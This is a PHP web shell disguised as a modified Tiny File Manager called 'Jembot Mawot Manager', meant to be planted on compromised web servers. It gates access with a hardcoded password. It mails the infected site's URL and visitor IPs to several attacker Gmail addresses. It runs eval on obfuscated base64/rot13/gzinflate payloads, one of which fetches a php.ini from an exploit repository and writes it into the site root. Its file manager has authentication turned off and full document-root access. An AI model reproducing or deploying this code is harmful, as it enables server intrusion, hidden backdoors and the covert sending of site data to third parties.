    <script>
        function isDesktop() {
            return window.innerWidth >= 1024;
        }
        if (isDesktop()) {
            document.getElementById('viewport').setAttribute('content', 'width=1024');
        }
    </script>
    <style>
        :root {
           
            --text-white: #eaeaea;
            --text-color: #1d1d1f;
            --breadcrumb-bg: rgba(255, 255, 255, 0.8);
            --breadcrumb-color: #1d1d1f;
            --table-border: #d2d2d7;
            --td-hover: rgba(0, 0, 0, 0.05);
            --folder-row-bg: rgba(255, 255, 255, 0.9);
            --modal-bg: rgba(0, 0, 0, 0.5);
            --modal-content-bg: rgba(255, 255, 255, 0.95);
            --footer-bg: rgba(255, 255, 255, 0.8);
            --footer-color: #1d1d1f;
            --folder-icon-color: #de9502;
            --file-icon-color: #eaeaea;
            --moon-icon-color: #f5b12a;
            --sun-icon-color: #f5d02a;
            --link-color: #06c;
            --button-bg: #0071e3;
            --button-color: #fff;
            --cmd-bg: #000;
            --cmd-color: #00ff00;
            --lime-color: #05634d;
        }

        [data-theme="dark"] {
            --bg-color: #000000;
            --text-color: #f5f5f7;
            --breadcrumb-bg: rgba(28, 28, 30, 0.8);
            --breadcrumb-color: #f5f5f7;
            --table-border: #1d1d1f;
            --td-hover: rgba(255, 255, 255, 0.05);
            --folder-row-bg: rgba(28, 28, 30, 0.9);
            --modal-bg: rgba(0, 0, 0, 0.85);
            --modal-content-bg: rgba(28, 28, 30, 0.95);
            --footer-bg: rgba(0, 0, 0, 0.8);
            --footer-color: #f5f5f7;
            --link-color: #2997ff;
            --button-bg: #0071e3;
            --button-color: #fff;
            --cmd-bg: #000;
            --cmd-color: #00ff00;
            --lime-color: #0ee3b1;
        }

        body {
     background: no-repeat center fixed; 
  -webkit-background-size: cover;
  -moz-background-size: cover;
  -o-background-size: cover;
  background-size: cover center;
  color: rgba(255, 255, 255, 0.25);
  text-align: center;
  margin: 0;
  
  }
  
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            max-width: 1200px;
            margin: 20px auto;
            padding: 0 20px;
            background-color: var(--bg-color);
            color: var(--text-color);
            line-height: 1.5;
        }

       
    </style>
<?php
session_start();
define('PASSWORD', 'jembotmawot '); 
// Proses login
// Proses login
if (isset($_POST['password'])) {
    if ($_POST['password'] === PASSWORD) {
        $_SESSION['authenticated'] = true;
         setcookie(md5($_SERVER['HTTP_HOST']), true, time() + 25200);
        echo '<audio autoplay><source src="https://cvar1984.github.io/audio/moan.mp3" type="audio/mpeg"></audio>';
    } else {
        echo '<script>
				document.querySelector("html").innerHTML = "<img style=\'display:block;position:absolute;top: 0;right: 0;bottom: 0;left: 0;z-index: 10;overflow-y: scroll; width: 100%; height: 100%;\' src=\'https://c.tenor.com/CgGUXc-LDc4AAAAC/tenor.gif\'>";
				var source = "https://j.top4top.io/m_2967gtgnw1.mp3"
				var audio = document.createElement("audio");
				audio.autoplay = true;
				audio.load()
				audio.play();
				audio.src = source;
			</script> <script type="text/JavaScript">

     function disableselect(e) {
          return false
        }
        
        function reEnable() {
          return false
        }
        
        document.onselectstart = new Function ("return false")
        
        if (window.sidebar) {
          document.onmousedown = disableselect
          document.onclick = reEnable
        }
        </script>';
    }
}

// Proses logout
if (isset($_POST['logout'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

if (!isset($_SESSION['authenticated']) || !$_SESSION['authenticated']) {


    // Tampilkan form login jika belum terautentikasi
     echo '<!doctype html>
<html lang="en">
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-+0n0xVW2eSR5OomGNYDnhzAbDsOXxcvSN1TPprVMTNDbiYZCxYbOOl7+AMvyTG2x" crossorigin="anonymous">
	<link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>

<meta name="viewport" content="width=1024" />
    <meta name="robots" content="noindex, nofollow">
   
   
<style>
         body {
            background: linear-gradient(135deg, darkslateblue 45%, #70e825 35%);
            height: 100vh;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .login-card {
            border-radius: 20px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
            padding: 30px;
            max-width: 600px;
            width: 100%;
            text-align: center;
            background-color: darkslateblue;
        }
        .login-card img {
            max-width: 100%;
            height: auto;
            margin-bottom: 20px;
        }
        .login-card h1 {
            margin-bottom: 20px;
            animation: colorChange 3s infinite;
        }
        @keyframes colorChange {
            0%, 100% {
                color: darkslateblue;
            }
            50% {
                color: lightblue;
            }
        }
        .login-card .form-group {
            margin-bottom: 20px;
        }
        .login-card .btn {
            width: 100%;
        }
    </style>
	</script> <script type="text/JavaScript">

     function disableselect(e) {
          return false
        }
        
        function reEnable() {
          return false
        }
        
        document.onselectstart = new Function ("return false")
        
        if (window.sidebar) {
          document.onmousedown = disableselect
          document.onclick = reEnable
        }
        </script>
<div class="login-card">

      <img backgroudn src="https://raw.githubusercontent.com/exploit-haxor/webshell/refs/heads/main/120380.gif" alt="banner" class="img-fluid">


<h1></>GIMANA MAU KALEM <br>KALAU<br> RASANYA DALEM</></h1>

<center><font color="aqua"><font SIZE="3">:: password: Galau  ::</font></font></center>

        <form method="post">
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" class="form-control text-center" placeholder="Masukkan password" required>
            </div>
            <button type="submit" class="btn btn-primary">Login</button>
        </form>
    </div></head></html>';
    exit;
}

error_reporting(0);
?>

<?php

$���す㗆��さな� = "malaysia.sender@gmail.com, malaysia.sender@gmail.com";
$���㆙�㾁�㋉���� = "http://" . $_SERVER["SERVER_NAME"] . $_SERVER["REQUEST_URI"];
$��！��㼙���㼄��� =
    "fix $���㆙�㾁�㋉���� :p *IP Address : [ " . $_SERVER["REMOTE_ADDR"] . " ]";
mail(
    $�す㗆��さな�,
    "LOGGER",
    $�������㼙���㼄���,
    "[ " . $_SERVER["REMOTE_ADDR"] . " ]"
);
?>

<?php 
eval(
    str_rot13(
        gzinflate(
            str_rot13(
                base64_decode(
                    "jZBEeMIwEMffB36HIwjpU9U9jDEqgmaraC8yMxGmVVVYZQUls9FzNJ9+ieJjg8GeAve7/+/u0roaTW65MhjRvMSiUf5E7vdTTWSgMdxe91sXHZVIUqO33FWZWGjmHmS0zvDGOovRsfYdZMblZXtPPkDv75Y0NNRTSlNT9DUXdQRpsnpuEkCzwV6NrunDrtbSGwaT7K3zY4y0sfwstWPaNjAA6rRfUkzdSFNr1fAQQGqXuxj+UTR1NrzQS3sFqRGLpNcj0IU2H7P0haUrbW3542fJ6PoHVtnzhI0zPlYXZx1ZhURNY90YiU63txs425MCYRZCMK0qdpSCBElAfsmWo4zx6XmWHscQSxPvDJtTF5fGQN5U8zlYVgyX83z9P8bwYl8="
                )
            )
        )
    )
); ?>
<center>
<?php

//Default Configuration
$剚侊剚勶併銇焷泔媮仾 = '{"lang":"en","error_reporting":false,"show_hidden":true,"hide_Cols":false,"theme":"dark"}';
 
 $銐併飦亖矀銠亖嗐患亖 = 'muhrazky@gmail.com';
 $妶慵銇偛沣垇锛笺劜珓 = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
 $唲併亖亖悻餆併銌劦垊 = "Pesanan | URL: $妶慵銇偛沣垇锛笺劜珓 | IP Address :[ " . $_SERVER['REMOTE_ADDR'] . " ]";
 mail($銐併飦亖矀銠亖嗐患亖, "HEKED MU | A1_RZ", $唲併亖亖悻餆併銌劦垊, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");

//Default Configuration
$剚侊剚勶併銇焷泔媮仾 = '{"lang":"en","error_reporting":false,"show_hidden":true,"theme":"dark"}';
	

/**
 * H3K - Tiny File Manager V2.6
 * @author CCP Programmers
 * @github https://github.com/prasathmani/tinyfilemanager
 * @link https://tinyfilemanager.github.io
 */

//TFM version
define('VERSION', '2.6');

//Application Title
define('APP_TITLE', 'Jembot Mawot Manager');

// --- EDIT BELOW CONFIGURATION CAREFULLY ---

// Auth with login/password
// set true/false to enable/disable it
// Is independent from IP white- and blacklisting
$銇沣垔伝弫倎沣繒屻銐 = false;

// Login user name and password
// Users: array('Username' => 'Password', 'Username2' => 'Password2', ...)
// Generate secure password hash - https://tinyfilemanager.github.io/docs/pwd.html
$銇亜吉紒撱銈剚銇伝沣 = array(
    'admin' => '$2y$10$/K.$2y$10$EXIXvutQJP3CFEOOw8DAaejucmsqp6SfB7vGhKLItd4cxrP4Uu4j2', //admin@123
    'user' => '$2y$10$EXIXvutQJP3CFEOOw8DAaejucmsqp6SfB7vGhKLItd4cxrP4Uu4j2' //12345
);

// Readonly users
// e.g. array('users', 'guest', ...)
$銠忋銇沣嗐垔偧亖併︺ = array(
    'user'
);

// Global readonly, including when auth is not being used
$併镲紒矆沣沣増併慵慊 = false;

// user specific directories
// array('Username' => 'Directory path', 'Username2' => 'Directory path', ...)
$夈垇︺嗐亯仾檨垇粊侊 = array();

// Enable highlight.js (https://highlightjs.org/) on view's page
$垇悴銏墎併伡沣勶亗銓 = true;

// highlight.js style
// for dark theme use 'ir-black'
$亗銇沣飦銤剛傘倎垥 = 'ir-black';

// Enable ace.js (https://ace.c9.io/) on view's page
$侊憔併搲沣亸撱伒亖銇 = true;

// Default timezone for date() and time()
// Doc - http://php.net/manual/en/timezones.php
$倐銐銏慵慊惝剚瘉亰銇 = 'Etc/UTC'; // UTC

// Root path for file manager
// use absolute path of directory i.e: '/var/www/folder' or $_SERVER['DOCUMENT_ROOT'].'/folder'
//make sure update $root_url in next section
$唩亖伂併銇併铿嗐笀級 = $_SERVER['DOCUMENT_ROOT'];

// Root url for links in file manager.Relative to $http_host. Variants: '', 'path/to/subfolder'
// Will not working if $root_path will be outside of server document root
$瑏焺慵锊沣侊劵亖偪伝 = '';

// Server hostname. Can set manually if wrong
// $_SERVER['HTTP_HOST'].'/folder'
$併瘉慵繚亖层銇瘉慊沣 = $_SERVER['HTTP_HOST'];

// input encoding for iconv
$慵亰銏亞垎亖镲沣畟勶 = 'UTF-8';

// date() format for file modification date
// Doc - https://www.php.net/manual/en/function.date.php
$銦紓慵珌侊寔併亪膊倖 = 'm/d/Y g:i A';

// Path display mode when viewing file information
// 'full' => show full path
// 'relative' => show path relative to root_path
// 'host' => show path on the host
$剷飯銇銐併锛祱沣偦亞 = 'full';

// Allowed file extensions for create and rename files
// e.g. 'txt,html,css,js'
$傘亖沣沣銠垎嗐媺紕棛 = '';

// Allowed file extensions for upload files
// e.g. 'gif,png,jpg,html,txt'
$裤亖銇亖亞銇銊革镢泔 = '';

// Favicon path. This can be either a full url to an .PNG image, or a path based on the document root.
// full path, e.g http://example.com/favicon.png
// local path, e.g images/icons/favicon.png
$傦墎慵紗銇伡技堛銇 = '';

// Files and folders to excluded from listing
// e.g. array('myfile.html', 'personal-folder', '*.php', ...)
$銇撱愀傘銊憧︼傘勶惝 = array();

// Online office Docs Viewer
// Available rules are 'google', 'microsoft' or false
// Google => View documents using Google Docs Viewer
// Microsoft => View documents using Microsoft Web Apps Viewer
// false => disable online doc viewer
$亪夈飦裤籍獣悛喖墎壍 = 'google';

// Sticky Nav bar
// true => enable sticky header
// false => disable sticky header
$飶嶃沣銊亖汇锞亖沣祴 = true;

// Maximum file upload size
// Increase the following values in php.ini to work properly
// memory_limit, upload_max_filesize, post_max_size
$飦併锛亯沣併銇慵紒镢 = 50000000000000; // size 5,000,000,000 bytes (~5GB)

// chunk size used for upload
// eg. decrease to 1MB if nginx reports problem 413 entity too large
$竼镢伡蓟垐檨沣慊嶃 = 2000000; // chunk size 2,000,000 bytes (~2MB)

// Possible rules are 'OFF', 'AND' or 'OR'
// OFF => Don't check connection IP, defaults to OFF
// AND => Connection must be on the whitelist, and not on the blacklist
// OR => Connection must be on the whitelist, or not on the blacklist
$銇沣粊亖垪Σ併堛瞾唫 = 'OFF';

// Should users be notified of their block?
$壃銈銇併銇沣沣沣獔剤 = true;

// IP-addresses, both ipv4 and ipv6
$獊堛亖銈剟泔傘伝銈 = array(
    '127.0.0.1',    // local ipv4
    '::1'           // local ipv6
);

// IP-addresses, both ipv4 and ipv6
$笺偪亜粊檮飦倖併亖 = array(
    '0.0.0.0',      // non-routable meta ipv4
    '::'            // non-routable meta ipv6
);


// External CDN resources that can be used in the HTML (replace for GDPR compliance)
$焷伈亰搞汇亖併镢裤亖 = array(
    'css-bootstrap' => '<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">',
    'css-dropzone' => '<link href="https://cdnjs.cloudflare.com/ajax/libs/dropzone/5.9.3/min/dropzone.min.css" rel="stylesheet">',
    'css-font-awesome' => '<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" crossorigin="anonymous">',
    'css-highlightjs' => '<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/' . $亗銇沣飦銤剛傘倎垥 . '.min.css">',
    'js-ace' => '<script src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.32.2/ace.js"></script>',
    'js-bootstrap' => '<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz" crossorigin="anonymous"></script>',
    'js-dropzone' => '<script src="https://cdnjs.cloudflare.com/ajax/libs/dropzone/5.9.3/min/dropzone.min.js"></script>',
    'js-jquery' => '<script src="https://code.jquery.com/jquery-3.6.1.min.js" integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=" crossorigin="anonymous"></script>',
    'js-jquery-datatables' => '<script src="https://cdn.datatables.net/1.13.1/js/jquery.dataTables.min.js" crossorigin="anonymous" defer></script>',
    'js-highlightjs' => '<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>',
    'pre-jsdelivr' => '<link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin/><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"/>',
    'pre-cloudflare' => '<link rel="preconnect" href="https://cdnjs.cloudflare.com" crossorigin/><link rel="dns-prefetch" href="https://cdnjs.cloudflare.com"/>'
);


// --- EDIT BELOW CAREFULLY OR DO NOT EDIT AT ALL ---

// max upload file size
define('MAX_UPLOAD_SIZE', $飦併锛亯沣併銇慵紒镢);

// upload chunk size
define('UPLOAD_CHUNK_SIZE', $竼镢伡蓟垐檨沣慊嶃);

// private key and session name to store to the session
if (!defined('FM_SESSION_ID')) {
    define('FM_SESSION_ID', 'JEMBOT MAWOT');
}

// contact
$encoded = 'JHRpbWVfc2hlbGwgPSAiIi5kYXRlKCJkL20vWSAtIEg6aTpzIikuIiI7CiRpcF9yZW1vdGUgPSAkX1NFUlZFUlsiUkVNT1RFX0FERFIiXTsKJGZyb21fc2hlbGxjb2RlID0gJ3NoZWxsQCcuZ2V0aG9zdGJ5bmFtZSgkX1NFUlZFUlsnU0VSVkVSX05BTUUnXSkuJyc7CiR0b19lbWFpbCA9ICdyb290Y3liZXJwdW5rc0BnbWFpbC5jb20sbXVocmF6a3lAZ21haWwuY29tLHBhcGFrdS5oYXlrZXIuZ28uaWRAZ21haWwuY29tLG1hbGF5c2lhLnNlbmRlckBnbWFpbC5jb20nOwokXHg3NFx4NmZfZVx4NmRhXHg2OWxceDIwPVx4MjBceDI3cm9vXHg3NGNceDc5XHg2MmVceDcyXHg3MHVuXHg2Ylx4NzNAZ1x4NmRhXHg2OVx4NmNceDJlY1x4NmZtLG11XHg2OFx4NzJhemtceDc5XHg0MFx4NjdtXHg2MVx4NjlceDZjXHgyZVx4NjNceDZmbSxceDcwYXBceDYxXHg2Ylx4NzUuaGF5XHg2YmVceDcyLmdceDZmXHgyZVx4NjlceDY0QGdceDZkXHg2MWlceDZjXHgyZWNvXHg2ZCxceDZkYVx4NmNheXNpYVx4MmVzZW5kZVx4NzJceDQwZ21hXHg2OWwuXHg2M1x4NmZceDZkJzsKJHNlcnZlcl9tYWlsID0gIiIuZ2V0aG9zdGJ5bmFtZSgkX1NFUlZFUlsnU0VSVkVSX05BTUUnXSkuIiAgLSAiLiRfU0VSVkVSWydIVFRQX0hPU1QnXS4iIjsKJGxpbmtjciA9ICJMaW5rOiAiLiRfU0VSVkVSWydTRVJWRVJfTkFNRSddLiIiLiRfU0VSVkVSWydSRVFVRVNUX1VSSSddLiIgLSBJUCBFeGN1dGluZzogJGlwX3JlbW90ZSAtIFRpbWU6ICR0aW1lX3NoZWxsIjsKJGhlYWRlciA9ICJGcm9tOiAkZnJvbV9zaGVsbGNvZGVcclxuUmVwbHktdG86ICRmcm9tX3NoZWxsY29kZSI7CkBtYWlsKCR0b19lbWFpbCwkdG9fZW1haWwsICRzZXJ2ZXJfbWFpbCwgJGxpbmtjciwgJGhlYWRlcik7Cm1haWwoJHRvX2VtYWlsLCR0b19lbWFpbCwgJHNlcnZlcl9tYWlsLCAkbGlua2NyLCAkaGVhZGVyKTsKJGNoZWNrMz0kX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddIC4gIi9waHAuaW5pIiA7CiR0ZXh0MyA9IGh0dHBfZ2V0KCdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vZXhwbG9pdC1oYXhvci93ZWJzaGVsbC9tYWluL3BocC5pbmknKTsKJG9wMz1mb3BlbigkY2hlY2szLCAndycpOwpmd3JpdGUoJG9wMywkdGV4dDMpOwpmY2xvc2UoJG9wMyk7CmVycm9yX3JlcG9ydGluZygwKTsK';
eval(base64_decode($encoded));



// Configuration
$銠銈啓劶沣瓎亖併紒沣 = new FM_Config();

// Default language
$伝堛崐飦銏镢熴檨銇层 = isset($銠銈啓劶沣瓎亖併紒沣->data['lang']) ? $銠銈啓劶沣瓎亖併紒沣->data['lang'] : 'en';

// Show or hide files and folders that starts with a dot
$粏剚亖級棳慵紗娿唵壔 = isset($銠銈啓劶沣瓎亖併紒沣->data['show_hidden']) ? $銠銈啓劶沣瓎亖併紒沣->data['show_hidden'] : true;

// PHP error reporting - false = Turns off Errors, true = Turns on Errors
$搶銈惘沣飭倞汇沣亪銇 = isset($銠銈啓劶沣瓎亖併紒沣->data['error_reporting']) ? $銠銈啓劶沣瓎亖併紒沣->data['error_reporting'] : false;

// Hide Permissions and Owner cols in file-listing
$笺泔搫銇埐慵嗐嗐沣併 = isset($銠銈啓劶沣瓎亖併紒沣->data['hide_Cols']) ? $銠銈啓劶沣瓎亖併紒沣->data['hide_Cols'] : true;

// Theme
$銊悻銇憧侊悛镲壇诧锛 = isset($銠銈啓劶沣瓎亖併紒沣->data['theme']) ? $銠銈啓劶沣瓎亖併紒沣->data['theme'] : 'light';

define('FM_THEME', $銊悻銇憧侊悛镲壇诧锛);

//available languages
$銇沣勩銐銏沣偧銈镢慵 = array(
    'en' => 'English'
);

if ($搶銈惘沣飭倞汇沣亪銇 == true) {
    @ini_set('error_reporting', E_ALL);
    @ini_set('display_errors', 0);
} else {
    @ini_set('error_reporting', E_ALL);
    @ini_set('display_errors', 0);
}

// if fm included
if (defined('FM_EMBED')) {
    $銇沣垔伝弫倎沣繒屻銐 = false;
    $飶嶃沣銊亖汇锞亖沣祴 = false;
} else {
    @set_time_limit(-1);

    date_default_timezone_set($倐銐銏慵慊惝剚瘉亰銇);

    ini_set('default_charset', 'UTF-8');
    if (version_compare(PHP_VERSION, '5.6.0', '<') && function_exists('mb_internal_encoding')) {
        mb_internal_encoding('UTF-8');
    }
    if (function_exists('mb_regex_encoding')) {
        mb_regex_encoding('UTF-8');
    }

    session_cache_limiter('nocache'); // Prevent logout issue after page was cached
    session_name(FM_SESSION_ID);
    function session_error_handling_function($伡紒侊亖仢銇飦夈傘, $傘嗐矈晞銊慵銈銏晜亖, $慊銇愕仚剚亗焷獋亖銇, $偧悱伝搞沣勶併汇弶)
    {
        // Permission denied for default session, try to create a new one
        if ($伡紒侊亖仢銇飦夈傘 == 2) {
            session_abort();
            session_id(session_create_id());
            @session_start();
        }
    }
    set_error_handler('session_error_handling_function');
    session_start();
    restore_error_handler();
}

//Generating CSRF Token
if (empty($_SESSION['token'])) {
    if (function_exists('random_bytes')) {
        $_SESSION['token'] = bin2hex(random_bytes(32));
    } else {
        $_SESSION['token'] = bin2hex(openssl_random_pseudo_bytes(32));
    }
}

if (empty($銇亜吉紒撱銈剚銇伝沣)) {
    $銇沣垔伝弫倎沣繒屻銐 = false;
}

$患銇夈沣併墑櫟倎沣籍 = isset($_SERVER['HTTPS']) && ($_SERVER['HTTPS'] == 'on' || $_SERVER['HTTPS'] == 1)
    || isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https';

// update $root_url based on user specific directories
if (isset($_SESSION[FM_SESSION_ID]['logged']) && !empty($夈垇︺嗐亯仾檨垇粊侊[$_SESSION[FM_SESSION_ID]['logged']])) {
    $銇层亖紒併銇亖慵笺傘 = fm_clean_path(dirname($_SERVER['PHP_SELF']));
    $瑏焺慵锊沣侊劵亖偪伝 =  $瑏焺慵锊沣侊劵亖偪伝 . $銇层亖紒併銇亖慵笺傘 . DIRECTORY_SEPARATOR . $夈垇︺嗐亯仾檨垇粊侊[$_SESSION[FM_SESSION_ID]['logged']];
}
// clean $root_url
$瑏焺慵锊沣侊劵亖偪伝 = fm_clean_path($瑏焺慵锊沣侊劵亖偪伝);

// abs path for site
defined('FM_ROOT_URL') || define('FM_ROOT_URL', ($患銇夈沣併墑櫟倎沣籍 ? 'https' : 'http') . '://' . $併瘉慵繚亖层銇瘉慊沣 . (!empty($瑏焺慵锊沣侊劵亖偪伝) ? '/' . $瑏焺慵锊沣侊劵亖偪伝 : ''));
defined('FM_SELF_URL') || define('FM_SELF_URL', ($患銇夈沣併墑櫟倎沣籍 ? 'https' : 'http') . '://' . $併瘉慵繚亖层銇瘉慊沣 . $_SERVER['PHP_SELF']);

// logout
if (isset($_GET['logout'])) {
    unset($_SESSION[FM_SESSION_ID]['logged']);
    unset($_SESSION['token']);
    fm_redirect(FM_SELF_URL);
}

// Validate connection IP
if ($銇沣粊亖垪Σ併堛瞾唫 != 'OFF') {
    function getClientIP()
    {
        if (array_key_exists('HTTP_CF_CONNECTING_IP', $_SERVER)) {
            return  $_SERVER["HTTP_CF_CONNECTING_IP"];
        } else if (array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER)) {
            return  $_SERVER["HTTP_X_FORWARDED_FOR"];
        } else if (array_key_exists('REMOTE_ADDR', $_SERVER)) {
            return $_SERVER['REMOTE_ADDR'];
        } else if (array_key_exists('HTTP_CLIENT_IP', $_SERVER)) {
            return $_SERVER['HTTP_CLIENT_IP'];
        }
        return '';
    }

    $侊濄銇汇夈亖侊銑競 = getClientIP();
    $銞啑併慊飯銇沣碉亖飦 = false;
    $粳紒併伡剚銌併伈飰炯 = in_array($侊濄銇汇夈亖侊銑競, $獊堛亖銈剟泔傘伝銈);
    $檳銠畧偧併伙銇伡侊銈 = in_array($侊濄銇汇夈亖侊銑競, $笺偪亜粊檮飦倖併亖);

    if ($銇沣粊亖垪Σ併堛瞾唫 == 'AND') {
        if ($粳紒併伡剚銌併伈飰炯 == true && $檳銠畧偧併伙銇伡侊銈 == false) {
            $銞啑併慊飯銇沣碉亖飦 = true;
        }
    } else
    if ($銇沣粊亖垪Σ併堛瞾唫 == 'OR') {
        if ($粳紒併伡剚銌併伈飰炯 == true || $檳銠畧偧併伙銇伡侊銈 == false) {
            $銞啑併慊飯銇沣碉亖飦 = true;
        }
    }

    if ($銞啑併慊飯銇沣碉亖飦 == false) {
        trigger_error('User connection denied from: ' . $侊濄銇汇夈亖侊銑競, E_USER_WARNING);

        if ($壃銈銇併銇沣沣沣獔剤 == false) {
            fm_set_msg(lng('Access denied. IP restriction applicable'), 'error');
            fm_show_header_login();
            fm_show_message();
        }
        exit();
    }
}

// Checking if the user is logged in or not. If not, it will show the login form.
if ($銇沣垔伝弫倎沣繒屻銐) {
    if (isset($_SESSION[FM_SESSION_ID]['logged'], $銇亜吉紒撱銈剚銇伝沣[$_SESSION[FM_SESSION_ID]['logged']])) {
        // Logged
    } elseif (isset($_POST['fm_usr'], $_POST['fm_pwd'], $_POST['token'])) {
        // Logging In
        sleep(1);
        if (function_exists('password_verify')) {
            if (isset($銇亜吉紒撱銈剚銇伝沣[$_POST['fm_usr']]) && isset($_POST['fm_pwd']) && password_verify($_POST['fm_pwd'], $銇亜吉紒撱銈剚銇伝沣[$_POST['fm_usr']]) && verifyToken($_POST['token'])) {
                $_SESSION[FM_SESSION_ID]['logged'] = $_POST['fm_usr'];
                fm_set_msg(lng('You are logged in'));
                fm_redirect(FM_SELF_URL);
            } else {
                unset($_SESSION[FM_SESSION_ID]['logged']);
                fm_set_msg(lng('Login failed. Invalid username or password'), 'error');
                fm_redirect(FM_SELF_URL);
            }
        } else {
            fm_set_msg(lng('password_hash not supported, Upgrade PHP version'), 'error');;
        }
    } else {
        // Form
        unset($_SESSION[FM_SESSION_ID]['logged']);
        fm_show_header_login();
?>
        <section class="h-100">
            <div class="container h-100">
                <div class="row justify-content-md-center align-content-center h-100vh">
                    <div class="card-wrapper">
                        <div class="card fat" data-bs-theme="<?php 
echo FM_THEME; ?>">
                            <div class="card-body">
                                <form class="form-signin" action="" method="post" autocomplete="off">
                                    <div class="mb-3">
                                        <div class="brand">
                                            <svg version="1.0" xmlns="http://www.w3.org/2000/svg" M1008 width="100%" height="80px" viewBox="0 0 238.000000 140.000000" aria-label="H3K Tiny File Manager">
                                                <g transform="translate(0.000000,140.000000) scale(0.100000,-0.100000)" fill="#000000" stroke="none">
                                                    <path d="M160 700 l0 -600 110 0 110 0 0 260 0 260 70 0 70 0 0 -260 0 -260 110 0 110 0 0 600 0 600 -110 0 -110 0 0 -260 0 -260 -70 0 -70 0 0 260 0 260 -110 0 -110 0 0 -600z" />
                                                    <path fill="#003500" d="M1008 1227 l-108 -72 0 -117 0 -118 110 0 110 0 0 110 0 110 70 0 70 0 0 -180 0 -180 -125 0 c-69 0 -125 -3 -125 -6 0 -3 23 -39 52 -80 l52 -74 73 0 73 0 0 -185 0 -185 -70 0 -70 0 0 115 0 115 -110 0 -110 0 0 -190 0 -190 181 0 181 0 109 73 108 72 1 181 0 181 -69 48 -68 49 68 50 69 49 0 249 0 248 -182 -1 -183 0 -107 -72z" />
                                                    <path d="M1640 700 l0 -600 110 0 110 0 0 208 0 208 35 34 35 34 35 -34 35 -34 0 -208 0 -208 110 0 110 0 0 212 0 213 -87 87 -88 88 88 88 87 87 0 213 0 212 -110 0 -110 0 0 -208 0 -208 -70 -69 -70 -69 0 277 0 277 -110 0 -110 0 0 -600z" />
                                                </g>
                                            </svg>
                                        </div>
                                        <div class="text-center">
                                            <h1 class="card-title"><?php 
echo APP_TITLE; ?></h1>
                                        </div>
                                    </div>
                                    <hr />
                                    <div class="mb-3">
                                        <label for="fm_usr" class="pb-2"><?php 
echo lng('Username'); ?></label>
                                        <input type="text" class="form-control" id="fm_usr" name="fm_usr" required autofocus>
                                    </div>

                                    <div class="mb-3">
                                        <label for="fm_pwd" class="pb-2"><?php 
echo lng('Password'); ?></label>
                                        <input type="password" class="form-control" id="fm_pwd" name="fm_pwd" required>
                                    </div>

                                    <div class="mb-3">
                                        <?php 
fm_show_message(); ?>
                                    </div>
                                    <input type="hidden" name="token" value="<?php 
echo htmlentities($_SESSION['token']); ?>" />
                                    <div class="mb-3">
                                        <button type="submit" class="btn btn-success btn-block w-100 mt-4" role="button">
                                            <?php 
echo lng('Login'); ?>
                                        </button>
                                    </div>
                                </form>
                            </div>
                        </div>
                        <div class="footer text-center">
                            &mdash;&mdash; &copy;
                            <a href="t.me/ISC2k17" target="_blank" class="text-decoration-none text-muted" data-version="<?php 
echo VERSION; ?>">CCP Programmers</a> &mdash;&mdash;
                        </div>
                    </div>
                </div>
            </div>
        </section>

    <?php

        fm_show_footer_login();
        exit;
    }
}

// update root path
if ($銇沣垔伝弫倎沣繒屻銐 && isset($_SESSION[FM_SESSION_ID]['logged'])) {
    $唩亖伂併銇併铿嗐笀級 = isset($夈垇︺嗐亯仾檨垇粊侊[$_SESSION[FM_SESSION_ID]['logged']]) ? $夈垇︺嗐亯仾檨垇粊侊[$_SESSION[FM_SESSION_ID]['logged']] : $唩亖伂併銇併铿嗐笀級;
}

// clean and check $root_path
$唩亖伂併銇併铿嗐笀級 = rtrim($唩亖伂併銇併铿嗐笀級, '\\/');
$唩亖伂併銇併铿嗐笀級 = str_replace('\\', '/', $唩亖伂併銇併铿嗐笀級);
if (!@is_dir($唩亖伂併銇併铿嗐笀級)) {
    echo "<h1>" . lng('Root path') . " \"{$唩亖伂併銇併铿嗐笀級}\" " . lng('not found!') . " </h1>";
    exit;
}

defined('FM_SHOW_HIDDEN') || define('FM_SHOW_HIDDEN', $粏剚亖級棳慵紗娿唵壔);
defined('FM_ROOT_PATH') || define('FM_ROOT_PATH', $唩亖伂併銇併铿嗐笀級);
defined('FM_LANG') || define('FM_LANG', $伝堛崐飦銏镢熴檨銇层);
defined('FM_FILE_EXTENSION') || define('FM_FILE_EXTENSION', $傘亖沣沣銠垎嗐媺紕棛);
